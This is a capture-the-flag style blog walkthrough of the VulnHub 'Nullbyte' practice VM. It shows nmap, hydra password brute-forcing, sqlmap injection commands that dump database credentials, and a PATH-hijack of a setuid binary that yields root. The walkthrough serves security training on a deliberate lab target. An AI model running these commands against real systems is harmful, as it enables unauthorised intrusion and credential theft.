---
layout: post
title: Nullbyte %0 walkthrough
tags:
- "%0"
- ly0n
- nullbyte
- vm
- vulnhub
---
Hey everyone this is the nullbyte VM walkthrough from vulnhub that was created by ly0n.
So we started with an nmap scan to check the open ports see their banners...>root@Tesla:~# nmap 192.168.7.133 -p- -A

Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2015-10-31 14:35 EET
Nmap scan report for 192.168.7.133 (192.168.7.133)
Host is up (0.00017s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          34114/tcp  status
|_  100024  1          40102/udp  status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
34114/tcp open  status  1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          34114/tcp  status
|_  100024  1          40102/udp  status
MAC Address: 00:0C:29:AD:C8:3A (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

i tried to connect on the ssh first but there was no clue there so i moved into the http enumeration

[![null1](https://trickster0.files.wordpress.com/2015/11/null1.png)](https://trickster0.files.wordpress.com/2015/11/null1.png)
i downloaded that illuminati cursed symbol picture file(btw i have nothing to do with illuminati and all that weird crap if u saw that triangled at the top of my website :P ) and checked it out for some steg style

more

>root@Tesla:~/Desktop# file main.gif 
main.gif: GIF image data, version 89a, 235 x 302
root@Tesla:~/Desktop# exif
bash: exif: command not found
root@Tesla:~/Desktop# strings main.gif 
GIF89a
P-): kzMb5nVYJw
cccIII@@@GGG444999```<<>>EEE
???^^^
.....snippet....

w8 a sec that looks like a smiley!!! what are u hiding???unveil ur secrets sesame..

[![null2](https://trickster0.files.wordpress.com/2015/11/null2.png)](https://trickster0.files.wordpress.com/2015/11/null2.png)
after checking the source code this is what we got

>-- this form isn't connected to mysql, password ain't that complex

of course first thing that popped to my head was bruteforcing with the classic rockyou.txt wordlist

>root@Tesla:~/Desktop# hydra -l none -P /usr/share/wordlists/rockyou.txt 192.168.7.133 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2015-10-31 14:48:16
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
[DATA] attacking service http-post-form on port 80
[80][http-post-form] host: 192.168.7.133   login: none   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-10-31 14:48:38

and then we used the pass elite

[![null3](https://trickster0.files.wordpress.com/2015/11/null3.png)](https://trickster0.files.wordpress.com/2015/11/null3.png)
after that i just typed enter to see  possible output

[![null4](https://trickster0.files.wordpress.com/2015/11/null4.png)](https://trickster0.files.wordpress.com/2015/11/null4.png)
this probably uses the mysql db so i thought to check for sql injection and i was correct so i started using sqlmap to speed up the process

>root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a --dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth

root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D mysql --tables
This gave me only a user table

root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D mysql -T user --columns
User,Password

root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D mysql -T user -C User,Password --dump
Database: mysql
Table: user
[6 entries]
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 |
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 |
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 |
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 |
| debian-sys-maint | *BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC |
| phpmyadmin       | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 |
+------------------+-------------------------------------------+

root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D phpmyadmin --tables
pma_users
this actually gave me nothing :/
root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D seth

+-------+
| users |
+-------+

root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D seth -T users --columns

+----------+-------------+
| Column   | Type        |
+----------+-------------+
| position | text        |
| user     | text        |
| id       | smallint(6) |
| pass     | text        |
+----------+-------------+

root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D seth -T users -C id,user,pass --dump

+----+--------+---------------------------------------------+
| id | user   | pass                                        |
+----+--------+---------------------------------------------+
| 1  | ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
| 2  | isis   | --not allowed--                             |
+----+--------+---------------------------------------------+


of course after this i checked on google for the hashes and luckily two of them have been cracked already

[![null5](https://trickster0.files.wordpress.com/2015/11/null5.png)](https://trickster0.files.wordpress.com/2015/11/null5.png)

[![null6](https://trickster0.files.wordpress.com/2015/11/null6.png)](https://trickster0.files.wordpress.com/2015/11/null6.png)
according to the databases that we found, there was a phpmyadmin one so i figured there should be phpmyadmin and quite accurately...

[![null7](https://trickster0.files.wordpress.com/2015/11/null7.png)](https://trickster0.files.wordpress.com/2015/11/null7.png)
after a few tries the username was root and the password sunnyvale

[![screenshot from 2015-10-31 150948](https://trickster0.files.wordpress.com/2015/11/screenshot-from-2015-10-31-150948.png)](https://trickster0.files.wordpress.com/2015/11/screenshot-from-2015-10-31-150948.png)
i figured that i could upload a web shell but there would be no reason for that since that would give me www access on the server and i dont like it since i remembered that i have actually found a few username and passwords to try out on the ssh :D

[![null8](https://trickster0.files.wordpress.com/2015/11/null8.png)](https://trickster0.files.wordpress.com/2015/11/null8.png)
obviously i connected as ramses with the password omega and this is the system enumeration step

[![null9](https://trickster0.files.wordpress.com/2015/11/null9.png)](https://trickster0.files.wordpress.com/2015/11/null9.png)
apparently there is an interested file named procwatch in the /var/www/backup folder

[![null10](https://trickster0.files.wordpress.com/2015/11/null10.png)](https://trickster0.files.wordpress.com/2015/11/null10.png)
in the read me file apparently he says that he needs to fix this messs... so we are lucky that we arrived early to the party before he fixed it. It looks like procwatch tries to run sh and ps but it doesnt do a very good job at it cause maybe the path location is wrong?or maybe god forbid havent been set yet? we will check it out with some binary tree analysis


>objdump -D procwatch

so now we are gonna check the main part of the program cause if we actually manage to run a shell there we will get root privileges in other words things will escalate quite soon :D

[![null11](https://trickster0.files.wordpress.com/2015/11/null11.png)](https://trickster0.files.wordpress.com/2015/11/null11.png)
apparently it pushes into the stack 7370 which in ascii is sp but because of little endian it is ps and then pushes a nullbyte(hence the name of the vm i guess) so the path is not set and if i will change it to a path i can use to get a shell things will get nastyyyy :P

[![null12](https://trickster0.files.wordpress.com/2015/11/null12.png)](https://trickster0.files.wordpress.com/2015/11/null12.png)
obviously u can see from the picture that i added the /tmp folder in the $PATH and copied the /bin/sh to the tmp folder as ps and gave executable permissions. so after i ran procwatch we got a root shell!!!
time to get the proof that we were here ;)

[![null13](https://trickster0.files.wordpress.com/2015/11/null13.png)](https://trickster0.files.wordpress.com/2015/11/null13.png)

so that is it folks. i want to thank ly0n for this challenge it was quite nice especially the way i had to realize how procwatch works or to be exact doesnt work :P and fianlly exploit it ;)
